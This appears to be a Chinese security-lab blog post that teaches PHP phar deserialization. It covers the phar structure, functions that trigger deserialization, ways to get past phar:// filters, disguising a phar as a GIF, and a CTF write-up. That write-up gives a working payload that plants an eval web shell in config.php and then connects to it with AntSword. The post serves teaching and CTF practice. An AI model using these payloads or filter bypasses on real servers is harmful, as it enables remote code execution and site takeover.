> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/sn-A2DPcEygcCexL29QMEg)

前段时间纵横杯遇到一题反序列化，当时队友做出来了，赛后尝试复现一下，并总结反序列化内容。

phar 的本质是一种压缩文件，会以序列化的形式存储用户自定义的 meta-data。

### Phar 文件结构

*   stub：phar 文件标识，以 `__HALT_COMPILER();?>`结尾
    
*   manifest：压缩文件的属性等信息，以序列化的形式存储自定义的 meta-data
    
*   contents：压缩文件的内容
    
*   signature：签名，在文件末尾
    

测试
==

首先将`php.ini`中的`phar.readonly`置为 Off，否则无法生成 phar 文件，而且这个参数是无法通过 ini_set() 进行修改的。

### 生成 phar 文件

```
<?php
   class TestObject {
  }

   @unlink("phar.phar");
   $phar = new Phar("phar.phar"); //后缀名必须为phar
   $phar->startBuffering();
   $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
   $o = new TestObject();
   $o ->data = 'th1e';
   $phar->setMetadata($o); //将自定义的meta-data存入manifest
   $phar->addFromString("test.txt", "test"); //添加要压缩的文件
   //签名自动计算
   $phar->stopBuffering();
?>
```

打开文件可以看到，以序列化储存的文件

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRVkcSKHfdobPlHfO0hkejSIuoiaNQIH5ibNwpMLVskEdEfFjJNmucicVQhEs4jmoXpZFbywZbTkOWGw/640?wx_fmt=png)

### 构造利用代码  

```
<?php
class TestObject{
   function __destruct(){
       echo $this->data;
  }
}
$filename = $_GET['filename'];
file_exists($filename);
?>
 
```

`?filename=phar://phar.phar/test.txt`

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRVkcSKHfdobPlHfO0hkejSmNxicGmuoZayTJJHHTSqXtCTlD1OxtKibxicujZHW9XUCw7ExeNY6LQCw/640?wx_fmt=png)

成功打印结果。

php 的文件系统函数在通过 phar:// 伪协议解析 phar 文件时，都会将`meta-data`进行反序列化，知道创宇总结了以下函数：

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRVkcSKHfdobPlHfO0hkejSiaXibo2YO5xTdFugozUBqcUIicTFl9Dja4XQc2QPTQA5HNocuKeREbg1w/640?wx_fmt=png)

其实不止如此，只要调用了`php_stream_open_wrapper`的函数，都存在这样的问题，经测试，网上提供的如下函数也都可以：

**exif**

*   `exif_thumbnail`
    
*   `exif_imagetype`
    

**gd**

*   `imageloadfont`
    
*   `imagecreatefrom`
    

**hash**

*   `hash_hmac_file`
    
*   `hash_file`
    
*   `hash_update_file`
    
*   `md5_file`
    
*   `sha1_file`
    

**file / url**

*   `get_meta_tags`
    
*   `get_headers`
    
*   `mime_content_type`
    

**standard**

*   `getimagesize`
    
*   `getimagesizefromstring`
    

**finfo**

*   `finfo_file`
    
*   `finfo_buffer`
    

**zip**

```
$zip = new ZipArchive();
$res = $zip->open('c.zip');
$zip->extractTo('phar://test.phar/test');
```

**Postgres**

```
<?php
$pdo = new PDO(sprintf("pgsql:host=%s;db));
@$pdo->pgsqlCopyFromFile('aa', 'phar://test.phar/aa');
```

**MySQL**

```
LOAD DATA LOCAL INFILE`也会触发这个`php_stream_open_wrapper
<?php
class A {
  public $s = '';
  public function __wakeup () {
       system($this->s);
  }
}
$m = mysqli_init();
mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
$s = mysqli_real_connect($m, 'localhost', 'root', '123456', 'easyweb', 3306);
$p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://test.phar/test\' INTO TABLE a LINES TERMINATED BY \'\r\n\' IGNORE 1 LINES;');
```

再配置一下 mysqld。（非默认配置）

```
[mysqld]
local-infile=1
secure_file_priv=""
```

Trick
=====

### 过滤`phar://`协议的绕过方式

*   `compress.bzip2://phar://`
    
*   `compress.zlib://phar:///`
    
*   `php://filter/resource=phar://`
    

### 文件格式绕过

```
<?php
   class TestObject {
  }

   @unlink("phar.phar");
   $phar = new Phar("phar.phar");
   $phar->startBuffering();
   $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
   $o = new TestObject();
   $phar->setMetadata($o); //将自定义meta-data存入manifest
   $phar->addFromString("test.txt", "test"); //添加要压缩的文件
   //签名自动计算
   $phar->stopBuffering();
?>
```

增加了 GIF89a 文件头，从而使其伪装成 gif 文件

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRVkcSKHfdobPlHfO0hkejSr5IkBbkAs7SzzAJWmtFBGVAQIOfrnA9tz00uNZUs8kIVwAugGHdwDQ/640?wx_fmt=png)

例子
==

### 2020 纵横杯 hello_php

文件泄漏下载

##### config.php

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRVkcSKHfdobPlHfO0hkejSjRagCaEzpA8DEicdiaibOQR5DgvOb1ibS8tRNCehVduibBSWteoeFEMiayYg/640?wx_fmt=png)

发现后台用户名密码登陆后台

登陆后发现上传接口

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRVkcSKHfdobPlHfO0hkejStVoMbibTwlG0JBqwjx2eJVocXedVw9oiav63Wzb43FLicuzBEu0LsGWDg/640?wx_fmt=png)

##### class.php

存在 phar:// 反序列化漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRVkcSKHfdobPlHfO0hkejSpgIUnIwecH2ibbTe32P8yibR81uY6DjCibTnoA91cEH2GfIPRPQExoibJA/640?wx_fmt=png)

##### Payload

```
<?php

class Config{
   public $title;
   public $comment;
   public $logo_url;
   public function __construct(){
       $this->title= 'th1e\';echo success;@eval($_POST['th1e']);?>';
  }

}
$phar = new Phar("aaa.phar"); //后缀名必须为 phar
$phar->startBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$object = new Config;
$phar->setMetadata($object); //将自定义的 meta-data 存入 manifest
$phar->addFromString("a.txt", "a"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
```

上传记录时间戳得到文件名

##### Index.php

发现函数`file_exists`

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRVkcSKHfdobPlHfO0hkejSZ609ibtgyO2pffWlmvH6JnmAHCP8YWYozPwLCQEKAOV8YIf8ow9belg/640?wx_fmt=png)

此时在看 config 文件已经写入一句话

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRVkcSKHfdobPlHfO0hkejSCn7jw4BGWN0UV3ZMVOusWdiaHiboUxHLcV0qchPH6RbzkN7ISWx4ZUibg/640?wx_fmt=png)

##### 蚁剑连接

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRVkcSKHfdobPlHfO0hkejS4anicqoUu0icuonBdibDdnUtYn3BSuc14QZooz5VgkrY4UZNA3HoruKKA/640?wx_fmt=png)

总结
==

框架中文件操作函数使用频繁，Phar 反序列的点很多，但随着 PHP8 的诞生，phar 不再进行反序列化，以后 phar 反序列化也将逐渐淡出人们的视野。  

Reference
=========

https://blog.csdn.net/qq_42181428/article/details/100995404

**关于山石网科安全技术研究院**

  

  

  

    山石安研院是山石网科的信息安全智库部门，主要负责反 APT 研究、出战及承办全球攻防赛事、高端攻防技术培训、全球中英文安全预警分析发布、各类软硬件漏洞挖掘和利用研究、承接国家网络安全相关课题、不定期发布年度或半年度的各类技术报告及公司整体攻防能力展现。技术方向包括移动安全、虚拟化安全、工控安全、物联安全、区块链安全、协议安全、源码安全、反 APT 及反窃密。  
    为多省公安厅提供技术支撑工作，为上合峰会、财富论坛、金砖五国等多次重大活动提供网络安保支撑工作。在多次攻防赛事中连获佳绩，网安中国行第一名，连续两届红帽杯冠军、网鼎杯线上第一名，在补天杯、极棒杯、全国多地的护网演习等也都获得优秀的成绩，每年获得大量的 CNVD、CNNVD、CICSVD、CVE 证书、编号和致谢。如需帮助请咨询 hslab@hillstonenet.com

![](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnSWuIjGFp2q9CdPia5gDNPoVcTmJNicOGv7G8JhomWthCbtIGXrhLJeia8F5FbTwY6tGJHOxA74xbCGQ/640?wx_fmt=jpeg)